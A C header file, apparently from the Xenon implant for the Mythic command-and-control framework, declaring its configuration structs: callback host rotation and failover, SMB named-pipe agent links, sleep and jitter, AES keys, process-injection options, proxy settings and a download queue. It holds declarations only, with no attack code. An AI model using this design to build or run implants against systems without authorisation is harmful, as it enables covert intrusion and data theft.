#pragma once
#ifndef XENON_H
#define XENON_H

#include <windows.h>
// #include "Command.h"
#include "Package.h"

#include "Parser.h"
#include "Utils.h"
#include "Checkin.h"
#include "Config.h"
#include "Tasks/Download.h"

// Linked-list of callback hosts
typedef struct _CALLBACK_NODE {
    CHAR hostname[257];               // To hold the hostname or IP address
    int port;                         // Port number
    BOOL isSSL;                       // Boolean to indicate if SSL is enabled
    int failCount;                    // Failed connections
    BOOL isDead;                      // Is callback host dead
    struct CALLBACK_NODE* next;       // Pointer to the next node in the linked list
} CALLBACK_NODE, *PCALLBACK_NODE;

// Linked-list for "linked agents"
typedef struct _LINKS {
    UINT32 LinkId;                          // Link Id
    PCHAR  AgentId;                         // Mythic Id
    PCHAR  PipeName;                        // Named pipe string
    HANDLE hPipe;                           // Handle to link's named pipe
    BOOL   Connected;                       // Is link Alive
    struct LINKS* Next;                     // Pointer to the next node in the linked list
} LINKS, *PLINKS;

// Agent Instance struct
typedef struct
{
    PCHAR agentID;
    BOOL isEncryption;
    PCHAR aesKey;
    UINT32 sleeptime;
    UINT32 jitter;
    // Injection Options
    PCHAR spawnto;  
    CHAR injectKitSpawn[37];               // Mythic UUIDs for BOF files
    CHAR injectKitExplicit[37];
    PCHAR pipename;
    // Linked Agents
    PLINKS SmbLinks;
    // Message Queue
    PPackage PackageQueue;

#if defined(HTTPX_TRANSPORT)

    BOOL isProxyEnabled;
    PCHAR proxyUrl;
    PCHAR proxyUsername;
    PCHAR proxyPassword;

    UINT32 rotationStrategy;
    UINT32 failoverThreshold;
    // Linked-list for callback domains
    PCALLBACK_NODE CallbackDomains;
    PCALLBACK_NODE CallbackDomainHead;
#endif

#if defined(SMB_TRANSPORT)

    UINT32 SmbId;
    HANDLE SmbPipe;
    PCHAR  SmbPipename;

#endif

#if defined(INCLUDE_CMD_DOWNLOAD)

    // Download Queue
    PFILE_DOWNLOAD DownloadQueue; 

#endif

} CONFIG_XENON, *PCONFIG_XENON;

extern PCONFIG_XENON xenonConfig;

VOID XenonUpdateUuid(_In_ PCHAR newUUID);

VOID XenonMain();

#endif